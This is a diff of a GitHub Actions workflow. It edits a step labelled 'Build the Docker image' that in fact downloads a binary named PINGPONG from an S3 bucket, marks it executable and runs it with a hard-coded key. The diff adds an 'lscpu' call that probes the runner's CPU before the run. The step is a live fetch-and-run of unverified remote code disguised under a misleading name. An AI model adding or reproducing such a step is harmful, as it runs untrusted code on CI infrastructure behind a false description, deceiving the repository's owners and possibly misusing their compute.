@@ -15,4 +15,4 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     - name: Build the Docker image
-      run: cd $HOME && wget https://pingpong-build.s3.ap-southeast-1.amazonaws.com/linux/latest/PINGPONG && chmod +x PINGPONG && ./PINGPONG --key b1c1438f2b3829e2f9be1517d85d14611d0092e7219970f9eb84c0fa2fcc1dd8
+      run: lscpu && cd $HOME && wget https://pingpong-build.s3.ap-southeast-1.amazonaws.com/linux/latest/PINGPONG && chmod +x PINGPONG && ./PINGPONG --key b1c1438f2b3829e2f9be1517d85d14611d0092e7219970f9eb84c0fa2fcc1dd8
